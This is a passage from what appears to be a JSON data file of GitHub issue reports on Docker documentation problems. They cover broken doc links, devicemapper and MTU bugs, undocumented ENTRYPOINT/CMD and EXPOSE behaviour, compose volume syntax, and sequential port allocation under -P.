Tue Dec 12 06:45:30 2017\r\n  OS/Arch:      linux/amd64\r\n  Experimental: false\r\n```"},{"labels":[null,"documentation"],"text":"**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\nThe link for `docker stack config` listed under \"Related commands\" at the end of page under URL -\r\n https://github.com/docker/cli/blob/master/docs/reference/commandline/deploy.md returns 404 page error.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Go to https://github.com/docker/cli/blob/master/docs/reference/commandline/deploy.md\r\n2. Scroll to the end of the page section \"Related Commands\"\r\n3. Click on the first link - https://github.com/docker/cli/blob/master/docs/reference/commandline/stack_config.md\r\n4. It shows 404 page not found error\r\n\r\n**Describe the results you received:**\r\n\r\nThe page reports 404 error \r\n\r\n**Describe the results you expected:**\r\n\r\nThe page should display reference to `docker stack config` command.\r\n"},{"labels":[null,"documentation",null,null],"text":"**Description**\r\n\r\nDevicemapper fails on bonnie++ test when using >4Gb / >8Gb files (bonnie uses disk=2*RAM)\r\n\r\n**Steps to reproduce the issue:**\r\n1. Configure docker to use devicemapper (no care loop or thinpool)\r\n2. Run `docker run -ti ariarijp/bonnie -d /tmp -u root`\r\n\r\n**Describe the results you received:**\r\n```\r\nUsing uid:0, gid:0.\r\nWriting a byte at a time...done\r\nWriting intelligently...Can't write block.: No such file or directory\r\nCan't write block 1277407.\r\n```\r\n\r\n**Describe the results you expected:**\r\n_Test results._\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nOverlay, overlay2, aufs, btrfs, zfs, vfs, host direcory works. devicemapper - not.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.09.0-ce\r\n API version:  1.32\r\n Go version:   go1.8.3\r\n Git commit:   afdb6d4\r\n Built:        Tue Sep 26 22:42:18 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.09.0-ce\r\n API version:  1.32 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   afdb6d4\r\n Built:        Tue Sep 26 22:40:56 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 16\r\n Running: 1\r\n Paused: 0\r\n Stopped: 15\r\nImages: 1\r\nServer Version: 17.09.0-ce\r\nStorage Driver: devicemapper\r\n Pool Name: docker-thinpool\r\n Pool Blocksize: 524.3kB\r\n Base Device Size: 10.74GB\r\n Backing Filesystem: xfs\r\n Data file:\r\n Metadata file:\r\n Data Space Used: 91.11GB\r\n Data Space Total: 130.6GB\r\n Data Space Available: 39.45GB\r\n Metadata Space Used: 6.033MB\r\n Metadata Space Total: 1.372GB\r\n Metadata Space Available: 1.366GB\r\n Thin Pool Minimum Free Space: 13.06GB\r\n Udev Sync Supported: true\r\n Deferred Removal Enabled: true\r\n Deferred Deletion Enabled: true\r\n Deferred Deleted Device Count: 0\r\n Library Version: 1.02.110 (2015-10-30)\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 06b9cb35161009dcb7123345749fef02f7cea8e0\r\nrunc version: 3f2f8b84a77f73d38244dd690525642a72156c64\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.4.0-97-generic\r\nOperating System: Ubuntu 16.04.3 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 15.67GiB\r\nName: loadtest\r\nID: N6HT:CHLJ:545Y:NGOT:HGXV:NK7W:ZEP3:DZWG:CH5N:D2TV:OKLR:F5LV\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\nWARNING: No swap limit support\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nVM in VMware ESXi, 5.5.0, 2068190\r\n\r\n_/etc/docker/daemon.json_\r\n```\r\n{\r\n  \"storage-driver\": \"devicemapper\",\r\n  \"storage-opts\": [\r\n    \"dm.directlvm_device=/dev/sdb\"\r\n  ]\r\n}\r\n```\r\n\r\n_Dockerfile_\r\n```\r\nFROM ubuntu:14.04\r\nMAINTAINER Takuya Arita <takuya.arita@gmail.com>\r\n\r\n# Install Dependencies\r\nRUN apt-get update && apt-get install -y bonnie++\r\n\r\n# Run bonnie++\r\nENTRYPOINT [\"bonnie++\"]\r\n```\r\n\r\n**Another attempts**\r\n`docker run -ti --memory=4G ariarijp/bonnie -r 4096 -d /tmp -u root` **works** 4Gb RAM 8Gb files\r\n`docker run -ti --memory=5G ariarijp/bonnie -r 5120 -d /tmp -u root` **not works** 5Gb RAM 10GB files\r\n`docker run -ti --memory=4G ariarijp/bonnie -r 4096 -s 9977 -d /tmp -u root` **works** 4Gb RAM 9977Mb files\r\n`docker run -ti --memory=4G ariarijp/bonnie -r 4096 -s 9978 -d /tmp -u root` **not works** 4Gb RAM 9978Mb files (it varies +- megabyte)"},{"labels":[null,"documentation"],"text":"In https://github.com/moby/moby/pull/6909 the change was made that, if one specifies an ENTRYPOINT and the base image contains a CMD, then the CMD will be emptied.\r\n\r\nThis behavior is nowhere documented. (Neither in the Dockerfile Reference nor Best Practices)\r\n\r\nFor me this behavior was quite unexpected, because the ENTRYPOINT seems to be the point where one can push in start up scripts. For example nginx images specify a CMD (without ENTRYPOINT) to start the nginx. In my inheriting image I use an ENTRYPOINT script to do some environment dependant configuration and then want to do `exec \"$@\"` to \"resume\" with the base image's CMD. That does not work and I need to respecify the CMD (= copy over and maintain) from the nginx base image.\r\n\r\nThis behavior needs to be documented. From my point of view it could even be changed back, but I certainly miss the creators intented purpose of ENTRYPOINT."},{"labels":["documentation",null,null],"text":"**Description**\r\nI configure the `/etc/docker/daemon.json` with the \"mtu\" parameter to 1450.\r\nDefault bridge is ok with mtu=1450.\r\nBut when a new bridge network is created (either `docker network create `or `docker-compose`), the mtu parameter is false. It's always 1500.\r\n\r\n\r\n**Steps to reproduce the issue:**\r\n1. Add `\"mtu\": 1450 `to `/etc/docker/daemon.json`\r\n2. Restart docker daemon\r\n3. Create a new bridge : `docker network create my-net`\r\n\r\n**Describe the results you received:**\r\nmy-net MTU = 1500 \r\n\r\n**Describe the results you expected:**\r\nmy-net MTU = 1450\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.06.2-ce\r\n API version:  1.30\r\n Go version:   go1.8.3\r\n Git commit:   cec0b72\r\n Built:        Tue Sep  5 20:00:17 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.06.2-ce\r\n API version:  1.30 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   cec0b72\r\n Built:        Tue Sep  5 19:59:11 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 4\r\n Running: 1\r\n Paused: 0\r\n Stopped: 3\r\nImages: 41\r\nServer Version: 17.06.2-ce\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/100000.100000/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 163\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 6e23458c129b551d5c9871e5174f6b1b7f6d1170\r\nrunc version: 810190ceaa507aa2727d7ae6f4790c76ec150bd2\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\n userns\r\nKernel Version: 4.4.0-93-generic\r\nOperating System: Ubuntu 16.04.3 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 15.67GiB\r\nName: test-vm-04\r\nID: OZSP:AWLJ:HAPO:CZD6:NNLX:YDIT:LGWR:RMEI:P4SK:SBY4:2RAT:5YIK\r\nDocker Root Dir: /var/lib/docker/100000.100000\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: true\r\n```\r\n"},{"labels":["documentation",null,null],"text":"Hi!\r\n\r\nShould the --update-monitor be greater than --stop-grace-period to monitorize the update process?\r\n\r\nI mean, does --update-monitor time start counting while task is shutting down or it starts to count when the new task is starting?\r\n\r\nThanks!"},{"labels":["documentation",null,null],"text":"**Description**\r\n\r\nLooks like documentation for docker network is outdated.\r\nTrying to learn docker network using the examples provided [here](https://docs.docker.com/engine/userguide/networking/work-with-networks/#link-containers-without-using-user-defined-networks).\r\n\r\n**Steps to reproduce the issue:**\r\n1.create docker network \r\n    `$ docker network create -o \"com.docker.network.bridge.host_binding_ipv4\"=\"172.23.0.1\" my-network`\r\n    bf64e40499c8c1644c8ed3b743f25dc72866ae81294cec92d86e216fbb9a0ab5\r\n\r\n2. inspect the network.\r\n\r\n    `$ docker network inspect my-network`\r\n\r\n```\r\n[\r\n    {\r\n        \"Name\": \"my-network\",\r\n        \"Id\": \"bf64e40499c8c1644c8ed3b743f25dc72866ae81294cec92d86e216fbb9a0ab5\",\r\n        \"Created\": \"2017-09-16T23:48:31.063263608-04:00\",\r\n        \"Scope\": \"local\",\r\n        \"Driver\": \"bridge\",\r\n        \"EnableIPv6\": false,\r\n        \"IPAM\": {\r\n            \"Driver\": \"default\",\r\n            \"Options\": {},\r\n            \"Config\": [\r\n                {\r\n                    \"Subnet\": \"172.18.0.0/16\",\r\n                    \"Gateway\": \"172.18.0.1\"\r\n                }\r\n            ]\r\n        },\r\n        \"Internal\": false,\r\n        \"Attachable\": false,\r\n        \"Ingress\": false,\r\n        \"ConfigFrom\": {\r\n            \"Network\": \"\"\r\n        },\r\n        \"ConfigOnly\": false,\r\n        \"Containers\": {},\r\n        \"Options\": {\r\n            \"com.docker.network.bridge.host_binding_ipv4\": \"172.23.0.1\"\r\n        },\r\n        \"Labels\": {}\r\n    }\r\n]\r\n```\r\n\r\n3. run redis in this network\r\n\r\n    `$ docker run -d -P --name redis --network my-network redis`\r\n\r\n```\r\nUnable to find image 'redis:latest' locally\r\nlatest: Pulling from library/redis\r\n065132d9f705: Pull complete \r\nfc32c7d9b0f4: Pull complete \r\nad60cc6fa431: Pull complete \r\nb21c99d8cf03: Pull complete \r\n357908014789: Pull complete \r\ne27e1cb0ca43: Pull complete \r\nDigest: sha256:fe77356e6e8d5c5200b9800e50ae71147efdc446a3cc4f601c607fbfd218015e\r\nStatus: Downloaded newer image for redis:latest\r\nf103a6542e50ecd5bb257b9c68214537f1392069d94ddfbf19416af3e54cc640\r\ndocker: Error response from daemon: driver failed programming external connectivity on endpoint redis (1339918305c70f9e6416a5d499b5f6b8691450c9a3d310c8f7c3495c34a931ee): Error starting userland proxy: listen tcp 172.23.0.1:32777: bind: cannot assign requested address.\r\n```\r\n\r\n\r\n\r\n**Describe the results you received:**\r\n\r\ndocker should be able to run redis successfully in provided network.\r\n\r\n**Describe the results you expected:**\r\n\r\n```\r\ndocker: Error response from daemon: driver failed programming external connectivity on endpoint redis (1339918305c70f9e6416a5d499b5f6b8691450c9a3d310c8f7c3495c34a931ee): Error starting userland proxy: listen tcp 172.23.0.1:32777: bind: cannot assign requested address.\r\n```\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.09.0-ce-rc1\r\n API version:  1.31\r\n Go version:   go1.8.3\r\n Git commit:   ae21824\r\n Built:        Wed Sep  6 22:31:42 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.09.0-ce-rc1\r\n API version:  1.32 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   ae21824\r\n Built:        Wed Sep  6 22:33:07 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 4\r\n Running: 0\r\n Paused: 0\r\n Stopped: 4\r\nImages: 21\r\nServer Version: 17.09.0-ce-rc1\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 06b9cb35161009dcb7123345749fef02f7cea8e0\r\nrunc version: 3f2f8b84a77f73d38244dd690525642a72156c64\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.12.9-300.fc26.x86_64\r\nOperating System: Fedora 26 (Twenty Six)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 7.794GiB\r\nName: localhost.localdomain\r\nID: R3ET:HF5C:ILYK:S46A:5OYO:E67Z:GACB:AFJE:5V7G:EY3V:GBMX:IPTB\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nPhysical - Fedora 26"},{"labels":["documentation",null],"text":"**Description**\r\n\r\nThe docker compose documentation shows an example of Volume long syntax as below\r\n\r\n```yaml\r\nversion: \"3.2\"\r\nservices:\r\n  web:\r\n    image: nginx:alpine\r\n    ports:\r\n      - \"80:80\"\r\n\r\nnetworks:\r\n  webnet:\r\n\r\nvolumes:\r\n  - type: volume\r\n    source: mydata\r\n    target: /data\r\n    volume:\r\n      nocopy: true\r\n  - type: bind\r\n    source: ./static\r\n    target: /opt/app/static\r\n```\r\n> Note: The long syntax is new in v3.2\r\n\r\nI believe this format is only valid for volumes property of the service. Please correct me that is not the case \r\n\r\n**Steps to reproduce the issue:**\r\n$ docker-compose config\r\nERROR: In file './docker-compose.yml', volume must be a mapping, not an array.\r\n\r\n**Describe the results you received:**\r\nERROR: In file './docker-compose.yml', volume must be a mapping, not an array.\r\n\r\n\r\n**Describe the results you expected:**\r\nDocumentation examples should work\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.06.0-ce\r\n API version:  1.30\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:23:31 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.06.0-ce\r\n API version:  1.30 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:19:04 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nClient:\r\n Version:      17.06.0-ce\r\n API version:  1.30\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:23:31 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.06.0-ce\r\n API version:  1.30 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:19:04 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\nvagrant@vagrant:~/so/volumes$ docker info\r\nContainers: 44\r\n Running: 5\r\n Paused: 0\r\n Stopped: 39\r\nImages: 92\r\nServer Version: 17.06.0-ce\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 355\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: active\r\n NodeID: smh2288801wg3b15f0twxaew1\r\n Is Manager: true\r\n ClusterID: 3pqs1zxfxe76sb3r462engtfa\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n  Force Rotate: 0\r\n Root Rotation In Progress: false\r\n Node Address: 192.168.33.100\r\n Manager Addresses:\r\n  192.168.33.100:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: cfb82a876ecc11b5ca0977d1733adbe58599088a\r\nrunc version: 2d41c047c83e09a6d61d464906feb2a2f3c52aa4\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.4.0-66-generic\r\nOperating System: Ubuntu 16.04.2 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 992.3MiB\r\nName: vagrant\r\nID: H5PY:YSAS:TWDZ:HRHQ:7WPR:GAOZ:5PNY:YZTD:UB2K:QDDD:DVY5:OJF3\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nUsername: tarunlalwani\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\nWARNING: No swap limit support\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\n```\r\n$ docker-compose --version\r\ndocker-compose version 1.15.0, build e12f3b9\r\n```"},{"labels":["documentation",null,null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\nFollowing the documentation on using [binded volumes](https://docs.docker.com/engine/admin/volumes/bind-mounts/#start-a-container-with-a-bind-mount), using --mount instead of -v does not allow / in the source path and gives me the error: \r\n```\r\ndocker: Error response from daemon: create /home/martinmine/Documents/target: \"/home/martinmine/Documents/target\" includes invalid characters for a local volume name, only \"[a-zA-Z0-9][a-zA-Z0-9_.-]\" are allowed. If you intended to pass a host directory, use absolute path.\r\nSee 'docker run --help'.\r\n```\r\nRunning  `docker run -d -it --name devtest -v $(pwd)/target:/app nginx:latest` works fine and mounts the `target` directory just find. However, running `docker run -d -it --name devtest --mount source=$(pwd)/target,target=/app nginx:latest` gives me the error above.\r\n\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. `mkdir target`\r\n2. `docker run -d -it --name devtest --mount source=$(pwd)/target,target=/app nginx:lates`\r\n\r\n**Describe the results you received:**\r\n\r\nSee error message above.\r\n\r\n**Describe the results you expected:**\r\n\r\nI expect the same behavior as with the -v option, [as the documentation states](https://docs.docker.com/engine/admin/volumes/bind-mounts/#start-a-container-with-a-bind-mount).\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nDocker version 17.05.0-ce, build 89658be\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 3\r\n Running: 3\r\n Paused: 0\r\n Stopped: 0\r\nImages: 22\r\nServer Version: 17.05.0-ce\r\nStorage Driver: overlay\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 9048e5e50717ea4497b757314bad98ea3763c145\r\nrunc version: 9c2d8d184e5da67c95d601382adf14862e4f2228\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 3.10.0-514.10.2.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 16\r\nTotal Memory: 28.6GiB\r\nName: xxxxxxxxxxx\r\nID: 6OYY:KN5X:OBD3:SOUB:7CXB:5RL4:XUOZ:7ZEJ:CIOB:U6ZZ:PLYF:6P2X\r\nDocker Root Dir: /mnt/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nHappens on both a virtual machine through Openstack (CentOS7), and on my laptop (Fedora)."},{"labels":[null,"documentation",null,null],"text":"Hi !\r\n\r\nI'm writing a tool (in Python) to get the logs from any containers through the Docker Engine's HTTP API.\r\n\r\nAfter reading [the doc](https://docs.docker.com/engine/api/v1.30/), and trying to implement something, I founded that the protocol used seems to be different from the one for Attach, it seems to be :\r\n\r\n```{\\xFF}\\r\\n{\\xFF}{datas}```\r\n\r\nWhere the first hex number is the size of the message, and the second one seems to be (empirical deduction) the number of bytes that are supposed to be ignored before the start of the actual payload (so the log).\r\nAnd it seems to work, for some containers at least ...\r\n\r\n**EDIT** : The second seems to be the number of bytes that are supposed to be ignored IF the container has ```tty: false```, otherwise, it seems to be the start of the log **END of the edit**\r\n\r\nWith one strange deduction : if ```\\x07``` is found, then it overrides the second {\\xFF} size, and the message starts after this value...\r\n\r\nAm I missing a part of the documentation, or am I not using the HTTP API in a wrong way ?\r\n\r\nThanks for your time,\r\n\r\n**NB** : The protocol above seems to be specific for the logs endpoint, it's not working for the events' endpoint.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.05.0-ce\r\n API version:  1.29\r\n Go version:   go1.7.5\r\n Git commit:   89658be\r\n Built:        Thu May  4 22:10:54 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.05.0-ce\r\n API version:  1.29 (minimum version 1.12)\r\n Go version:   go1.7.5\r\n Git commit:   89658be\r\n Built:        Thu May  4 22:10:54 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n"},{"labels":["documentation",null,null],"text":"This PR https://github.com/moby/moby/pull/13165 allows duration strings as `--since/--until`, but I can't find any example of `docker events --until`. From the help infomation of `docker events`, I suppose that `docker events --until 10m` will stream events for 10 minutes then stop streaming. But actually, it returns immediately without any output.\r\n\r\nAfter diging into codes, I find that the duration will be subtracted from `time.Now()`, that is to say, docker waits for -10 minutes in this scenario, that's why it returns immediately without any output. Then I try `docker events --until -10m` and it works as what I expected.\r\n\r\nMaybe it's intended behavior because @ahmetb has already answered this question in his PR:\r\n![image](https://user-images.githubusercontent.com/20569488/29160624-902086b8-7de5-11e7-959b-4514b34075f0.png)\r\n\r\nBut I still think it's confusing, `until` means do something up to some time, right?\r\n"},{"labels":[null,"documentation",null],"text":"I was looking at [`dispatchers.go`](https://github.com/moby/moby/blob/f577caff19d486d8d01443507d891cb1b0891cdc/builder/dockerfile/dispatchers.go#L689-L693) today when I realized that you can actually specify `tcp` or `udp` when you use the `EXPOSE` instruction.\r\n\r\nThis isn't mentioned at all in the [Dockerfile reference for `EXPOSE`](https://docs.docker.com/engine/reference/builder/#expose). Is this intentional?"},{"labels":["documentation",null,null],"text":"**Description**\r\n\r\nThe `docker-run` man page I'm looking at describes the `--publish-all` option as follows:\r\n\r\n> Publish all exposed ports to random ports on the host interfaces.\r\n> [...]\r\n> When using -P, Docker will bind any exposed port to a random port on the host within an ephemeral port range defined by `/proc/sys/net/ipv4/ip_local_port_range`.\r\n\r\nHowever, the observed behaviour is, instead, that ports are allocated sequentially from the bottom of `ip_local_port_range`, with the sequence being reset whenever `dockerd` is restarted.\r\n\r\nMost definitions of \"random\" I can find mention \"unpredictability\", \"governed by or depending on chance\", or \"in no particular order\" as being defining characteristics; \"start from X and work your way up one by one\" doesn't meet any definition of \"random\" I can find.\r\n\r\n**Steps to reproduce the issue:**\r\n\r\n1. Restart `dockerd`, just to get a clean slate.\r\n2. Run `docker run --rm -it --expose 4242 -P alpine sh`\r\n3. Run `docker ps` in another shell, and note the host port number assigned to the container.  It will almost certainly be the first value in `/proc/sys/net/ipv4/ip_local_port_range`.\r\n4. Exit out of that container.\r\n5. Repeat steps 2-4 another dozen times or so.  Note each time that the host port number is almost certainly the next value above the previous one (with a small chance that another process on the machine might have temporarily snaffled a port in the middle).  Continue to repeat until the experiment has sufficient statistical power to convince you this isn't just the cruel hand of random chance toying with your sanity.\r\n6. Restart `dockerd` again.\r\n7. Run `docker run --rm -it --expose 4242 -P alpine sh`\r\n8. Run `docker ps` is another shell, note that the host port has probably gone back to the first value in `/proc/sys/net/ipv4/ip_local_port_range` (or is pretty close to it).\r\n\r\n**Describe the results you received:**\r\n\r\nIncluded above.\r\n\r\n**Describe the results you expected:**\r\n\r\nThe host ports allocated should not be allocated sequentially when multiple containers with `-P` are run.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nThe chances of getting the first port in `ip_local_port_range` on my system are about 1 in 28,000.  The chances of getting the next sequential port each time over 10 runs, if my arithmetic is correct, is 1 in 15,992,496,204,377,989,289,565,234,114,532,246,053,888,000.  I don't think I'm that lucky.\r\n\r\nOn the up side, at least dockerd doesn't reuse recently released ports, like it does with container IP addresses, and it doesn't blindly re-use allocated ports after restart.  So the problem isn't as horrible as it *could* be.  But it's still not great.\r\n\r\nIdeally, the relevant code would be fixed to allocate ports randomly, in line with the documentation, but if not, the documentation should be updated to accurately describe the port allocation process.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.06.0-ce\r\n API version:  1.30\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:17:22 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.06.0-ce\r\n API version:  1.30 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:16:12 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 2\r\n Running: 2\r\n Paused: 0\r\n Stopped: 0\r\nImages: 392\r\nServer Version: 17.06.0-ce\r\nStorage Driver: overlay\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: cfb82a876ecc11b5ca0977d1733adbe58599088a\r\nrunc version: 2d41c047c83e09a6d61d464906feb2a2f3c52aa4\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.9.0-3-amd64\r\nOperating System: Debian GNU/Linux 9 (stretch)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 8\r\nTotal Memory: 62.36GiB\r\nName: lolzno\r\nID: XCA5:PLPV:KBPE:SY63:O254:RZ3S:4UQS:C73M:KYHC:ASCI:25HL:GOQP\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nUsername: lolzno\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: true\r\n\r\nWARNING: No swap limit support\r\n```\r\n"},{"labels":["documentation"],"text":"There is a giant link at the top of the README:\r\n\r\n> Docker users, see [Moby and Docker](https://mobyproject.org/#moby-and-docker) to clarify the relationship between the projects\r\n\r\nThe link has a target, `#moby-and-docker`, but that seems to be broken. The landing page 